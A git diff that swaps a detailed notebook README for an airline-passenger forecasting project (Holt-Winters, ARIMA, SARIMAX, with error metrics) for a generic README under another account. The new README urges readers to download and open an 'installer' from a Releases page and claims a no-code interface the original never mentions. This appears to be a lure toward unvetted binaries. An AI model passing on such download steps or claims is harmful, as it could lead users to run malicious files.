@@ -1,222 +1,62 @@
-<div align="center">
-
-# ✈️ **Airline Passenger Demand Forecasting using Time Series Models**
-
-</div>
-
----
-
-## 🧩 **Project Overview**
-
-This project focuses on forecasting **monthly airline passenger traffic** using historical data that exhibits clear **trend** and **seasonality** patterns.  
-By leveraging statistical time series models, the goal is to predict future passenger volumes to assist in **capacity planning**, **resource allocation**, and **strategic decision-making** for airline operations.  
-
-Three forecasting models are implemented and compared — **Holt-Winters Exponential Smoothing**, **ARIMA**, and **SARIMAX** — to determine which provides the most accurate and stable forecasts.
-
----
-
-## 🎯 **Objectives**
-
-- Analyze and visualize monthly airline passenger trends and seasonality  
-- Build and tune Holt-Winters, ARIMA, and SARIMAX forecasting models  
-- Compare model accuracy and evaluate forecasting performance  
-- Predict future passenger demand and visualize forecast intervals  
-- Interpret findings for actionable insights in airline planning  
-
----
-
-## ⚙️ **Key Methods**
-
-1. **Time Series Decomposition** – To separate trend, seasonality, and residual components  
-2. **Stationarity Testing** – Using Augmented Dickey-Fuller (ADF) test  
-3. **Model Fitting & Parameter Selection** – Grid search for ARIMA/SARIMAX hyperparameters  
-4. **Forecast Evaluation** – Based on metrics such as RMSE, MAPE, and AIC  
-5. **Visualization** – Forecast plots with confidence intervals to interpret results  
-
----
-
-## 📷 **Visualizations**
-
----
-
-### 🧭 Monthly Airline Passengers
-![Monthly Airline Passengers](images/Monthly%20Airline%20Passengers.png)  
-**Description:** Displays the long-term upward trend and recurring seasonal spikes in air travel.
-
----
-
-### 📉 Rolling Statistics
-![Rolling Statistics](images/Rolling%20Statistics.png)  
-**Description:** Shows the rolling mean and standard deviation to assess stationarity in the time series.
-
----
-
-### 🔍 Decompose the Time Series
-![Decompose the Time Series](images/Decompose%20the%20Time%20Series.png)  
-**Description:** Breaks the time series into **trend**, **seasonal**, and **residual** components for deeper insight.
-
----
-
-### 📈 Holt-Winters Forecast vs Actual
-![Holt-Winters Forecast vs Actual](images/Holt-Winters%20Forecast%20vs%20Actual.png)  
-**Description:** Demonstrates how the Holt-Winters model effectively captures both trend and seasonality in the dataset.
-
----
-
-### ⚙️ ARIMA Forecast vs Actual
-![ARIMA Forecast vs Actual](images/ARIMA%20Forecast%20vs%20Actual.png)  
-**Description:** Highlights ARIMA’s performance — captures trend but fails to model the seasonal variations accurately.
-
----
-
-### 🌦️ SARIMAX Forecast vs Actual
-![SARIMAX Forecast vs Actual](images/SARIMAX%20Forecast%20vs%20Actual.png)  
-**Description:** Shows the SARIMAX model’s superior fit, accurately modeling both seasonal and trend components.
-
----
-
-## 📈 **Model Insights and Comparison**
-
-This section summarizes the performance evaluation of the three forecasting models — **Holt-Winters**, **ARIMA**, and **SARIMAX** — applied to the airline passengers dataset.
-
----
-
-### ✳️ **1. Holt-Winters Exponential Smoothing Forecast**
-
-#### **Key Insights**
-- Successfully captured both **trend** and **seasonality** in the data.  
-- Forecasted values closely matched the **true test data**, especially during **seasonal peaks**.  
-- Slight **underestimation at troughs** but strong overall alignment.  
-- Ideal for datasets with **multiplicative seasonality**.
-
-#### **Model Performance**
-- **MAE:** `10.30`  
-- **RMSE:** `15.81`
-
-> ✅ **Conclusion:**  
-Holt-Winters achieved the **lowest error** and provided the most accurate forecast.  
-It serves as the **best-performing baseline model** for this dataset.
-
----
-
-### ⚙️ **2. ARIMA Forecast**
-
-#### **Key Insights**
-- Accurately modeled the **overall upward trend** but **failed to capture seasonality**.  
-- Forecasted curve appeared **too smooth**, missing periodic peaks and dips.  
-- Unsuitable for datasets with **strong seasonal patterns**.
-
-#### **Model Performance**
-- **MAE:** `41.83`  
-- **RMSE:** `55.22`
-
-> ⚠️ **Conclusion:**  
-ARIMA is **ineffective for seasonal datasets**; forecasts lacked seasonal structure and had high error values.
-
----
-
-### 🌦️ **3. SARIMAX Forecast**
-
-#### **Key Insights**
-- Captured both **trend** and **seasonality** accurately.  
-- Forecasts aligned closely with the actual data across the entire test set.  
-- More robust than ARIMA, allowing inclusion of **exogenous regressors**.  
-
-#### **Model Performance**
-- **MAE:** `13.99`  
-- **RMSE:** `17.20`
-
-> ✅ **Conclusion:**  
-SARIMAX produced **reliable and stable forecasts**, effectively modeling seasonal patterns with slightly higher complexity.
-
----
-
-## 📊 **4. Model Comparison Summary**
-
-| Model              | MAE    | RMSE   | Key Strengths                                      | Limitations |
-|--------------------|--------|--------|----------------------------------------------------|--------------|
-| **ARIMA**          | 41.83  | 55.22  | Captures overall trend                             | Fails to model seasonality |
-| **Holt-Winters**   | 10.30  | 15.81  | Best accuracy, captures trend & seasonality         | Slight underestimation at troughs |
-| **SARIMAX**        | 13.99  | 17.20  | Handles trend, seasonality, and exogenous factors   | Slightly higher RMSE than Holt-Winters |
-
----
-
-## 🏆 **5. Final Conclusion & Recommendations**
-
-- **Best Model:** 🥇 **Holt-Winters Exponential Smoothing**  
-  - Lowest RMSE (`15.81`), best alignment with actual values, interpretable, and simple to implement.  
-- **Runner-Up:** 🥈 **SARIMAX**  
-  - Nearly as accurate, highly flexible, and suitable for advanced forecasting with external features.  
-- **Least Effective:** 🚫 **ARIMA**  
-  - Poor at modeling seasonal data and resulted in the highest RMSE (`55.22`).
-
-> **Final Takeaway:**  
-For datasets with **strong trend and seasonality**,  
-- Use **Holt-Winters** for simplicity and accuracy.  
-- Choose **SARIMAX** for complex scenarios or inclusion of external variables.  
-- Avoid **ARIMA** unless data is non-seasonal or stationarized.
-
----
-
-## 💡 **Key Insights & Outcomes**
-
-- The airline passenger data shows **clear seasonality** and **long-term growth trend**.  
-- **SARIMAX and Holt-Winters** are both suitable for forecasting, with Holt-Winters slightly outperforming.  
-- Time series forecasting enables better **demand planning and operational forecasting** in the airline industry.  
-- The models provide a framework extendable to similar business forecasting problems.
-
----
-
-## 🧠 **Technologies Used**
-
-- **Python 3.x**  
-- **Pandas**, **NumPy** – Data manipulation and numerical computations  
-- **Matplotlib**, **Seaborn** – Visualization  
-- **Statsmodels** – Time series modeling (ARIMA, SARIMAX, Holt-Winters)  
-- **Scikit-learn** – Evaluation metrics  
-- **Jupyter Notebook** – Interactive development environment  
-
----
-
-## 🛠️ **Setup & Installation Instructions**
-
-1. **Clone this repository:**
-   ```bash
-   git clone https://github.com/indu-explores-data/Airline-Passenger-Forecasting.git
-   cd Airline-Passenger-Forecasting
-   ```
-2. Create a virtual environment (Optional):
-   ```
-   python -m venv venv
-   source venv/bin/activate   # macOS/Linux
-   venv\Scripts\activate      # Windows
-3. Install dependencies:
-   ```
-   pip install -r requirements.txt
-   ```
-4. Launch the Jupyter Notebook:
-   ```
-   jupyter notebook Airline Passenger Forecasting.ipynb 
----
-
-## **▶️ Usage Instructions**
-
-- Load the dataset (**airline-passengers.csv** data).
-- Run the notebook `Airline Passenger Forecasting.ipynb` sequentially to preprocess data, visualize, and fit models.
-- Evaluate model performance using RMSE and MAE.
-- Visualize forecast results and confidence intervals.
-- Compare forecasts across ARIMA, Holt-Winters, and SARIMAX.
-
----
-
-## 🔗 Connect with Me
-
-Let’s connect on LinkedIn for project discussions or data-driven collaborations:
-
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Profile-blue?logo=linkedin)](https://www.linkedin.com/in/indu-r-3a3767170/)
-
----
-
-## 🙌 Feedback & Support
-
-If you found this project helpful, please ⭐ star the repository and share your thoughts. Suggestions and contributions are always welcome!  
+# ✈️ Airline-Passenger-Forecasting - Make Smarter Travel Predictions
+
+## 🌐 Table of Contents
+1. [🚀 Getting Started](#🚀-getting-started)
+2. [📥 Download & Install](#📥-download-&-install)
+3. [📊 How It Works](#📊-how-it-works)
+4. [🔍 Features](#🔍-features)
+5. [📈 Use Cases](#📈-use-cases)
+6. [⚙️ Requirements](#⚙️-requirements)
+7. [📞 Support](#📞-support)
+
+## 🚀 Getting Started
+Welcome to the Airline Passenger Forecasting project! This tool helps you forecast monthly airline passenger demand using proven time series models. You can analyze trends, seasonality, and model performance to find the most accurate forecasting technique for real-world airline data.
+
+## 📥 Download & Install
+To get started, visit the Releases page for the latest version of the application.
+
+[![Download Airline-Passenger-Forecasting](https://img.shields.io/badge/Download-Airline%20Passenger%20Forecasting-blue.svg)](https://github.com/ASADIMVU/Airline-Passenger-Forecasting/releases)
+
+1. Click the link above to go to the Releases page.
+2. Find the latest version of the software.
+3. Download the installer for your operating system.
+4. Open the downloaded file to begin the installation.
+5. Follow the on-screen instructions to complete the installation.
+
+## 📊 How It Works
+The Airline Passenger Forecasting tool uses various classical time series models, including:
+
+- **Holt-Winters**: This method accounts for seasonal trends and helps improve accuracy.
+- **ARIMA**: A powerful modeling technique for understanding and forecasting time series data.
+- **SARIMAX**: An extension of ARIMA that includes seasonal effects and exogenous variables, if applicable.
+
+The application analyzes historical data to identify patterns and generate forecasts for future airline passengers.
+
+## 🔍 Features
+- **Multiple Forecasting Models**: Use Holt-Winters, ARIMA, and SARIMAX for diverse analytical perspectives.
+- **Trend and Seasonality Analysis**: Understand monthly fluctuations and seasonal patterns in airline traffic.
+- **User-Friendly Interface**: Designed for average computer users; no programming knowledge required.
+- **Interactive Data Visualization**: Visualize past passenger data and future forecasts clearly and effectively.
+- **Performance Evaluation**: Compare model performance based on historical data accuracy.
+
+## 📈 Use Cases
+- **Airlines**: Predict passenger counts to improve flight planning and resource allocation.
+- **Travel Agencies**: Use forecasts to recommend travel packages based on expected demand.
+- **Policy Makers**: Aid in infrastructure planning by understanding future passenger trends.
+- **Data Analysts**: Enhance analysis skills by working with robust forecasting techniques.
+
+## ⚙️ Requirements
+To run the Airline Passenger Forecasting tool, your computer should meet the following requirements:
+
+- **Operating System**: Windows 10/11, macOS, or Linux.
+- **RAM**: Minimum of 4 GB recommended.
+- **Storage**: At least 500 MB of free space.
+- **Python**: Version 3.7 or higher, if running locally.
+- **Libraries**: Necessary Python libraries include statsmodels, pandas, and matplotlib. These will be installed automatically during setup.
+
+## 📞 Support
+If you have any questions or need assistance, feel free to reach out. You can open an issue in the GitHub repository or email the support team directly.
+
+For more detailed discussions, please visit the [Discussions page](https://github.com/ASADIMVU/Airline-Passenger-Forecasting/discussions). 
+
+We are here to help you make the most of your forecasting experience. Enjoy making informed travel predictions!
